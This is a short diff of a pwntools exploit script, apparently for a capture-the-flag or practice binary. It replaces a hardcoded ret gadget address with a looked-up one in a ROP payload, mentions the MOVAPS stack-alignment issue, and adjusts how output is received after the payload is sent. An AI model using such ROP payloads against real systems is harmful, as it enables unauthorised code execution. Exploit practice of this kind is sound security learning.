@@ -55,7 +55,7 @@ rop = ROP(exe)
 # TODO fix  def __get_cachefile_name(self, files): in "/usr/local/lib/python3.6/dist-packages/pwnlib/rop/rop.py
 ret_gadget = rop.ret
 print(ret_gadget.address)
-payload += p64(0x40053e)
+payload += p64(ret_gadget.address )
 
 '''
 The MOVAPS issue
@@ -82,10 +82,10 @@ io.clean()
 
 io.sendline(payload)
 
-#io.recvline(timeout = 2)
-#io.recvline(timeout = 2)
+io.recv(timeout = 2)
+io.recv(timeout = 2)
 
 #kill dead pane - ctrl b + x
 
-io.interactive()
+#io.interactive()
 
